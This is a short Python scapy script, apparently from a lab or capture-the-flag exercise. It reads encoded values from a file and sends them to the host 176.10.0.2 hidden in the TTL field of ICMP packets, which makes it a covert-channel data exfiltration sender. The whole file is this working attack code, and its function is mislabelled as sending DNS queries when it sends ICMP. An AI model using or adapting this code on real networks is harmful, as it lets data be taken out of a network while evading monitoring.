from scapy.all import *
import sys

def send_dns_queries(destination_ip, ttl_values):

    for ttl in ttl_values:
        send(IP(dst=destination_ip, ttl=ttl)/ICMP(), verbose=0)

if __name__ == "__main__":
    try:
        with open("ttl_values.txt", "r") as f:
            ttl_values = [int(line.strip()) for line in f]

        send_dns_queries("176.10.0.2", ttl_values)
        print(f"[+] Sent {len(ttl_values)} ICMP queries.")
    except FileNotFoundError:
        print("Error: Run encode.py first to create ttl_values.txt")
        sys.exit(1)

